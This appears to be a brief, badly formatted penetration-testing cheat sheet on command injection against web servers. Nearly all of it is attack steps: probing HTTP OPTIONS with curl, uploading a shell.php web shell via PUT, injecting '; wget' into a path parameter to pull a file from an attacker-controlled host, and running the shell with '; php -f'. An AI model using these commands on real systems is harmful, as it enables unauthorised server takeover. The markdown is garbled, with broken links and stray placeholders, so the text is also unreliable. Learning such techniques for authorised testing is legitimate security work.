# **Command Injection**

**

## Command Injection

**

##   
File Traverse:  
website.com/file.php[?path=/]  
  
Test HTTP options using curl:  
curl -vX OPTIONS [website]  
  
Upload file using CURL to website with PUT option available  
curl --upload-file shell.php --url

[http://](http://192.168.218.139/test/shell.php)

## x.x.x.x  
  
Transfer file (Try temp directory if not writable)(wget -O tells it where to store):  
?path=/; wget

[http://IPADDRESS:8000/FILENAME.EXTENTION;](http://ipaddress:8000/FILENAME.EXTENTION;)

##   
  
Activate shell file:  
; php -f filelocation.php;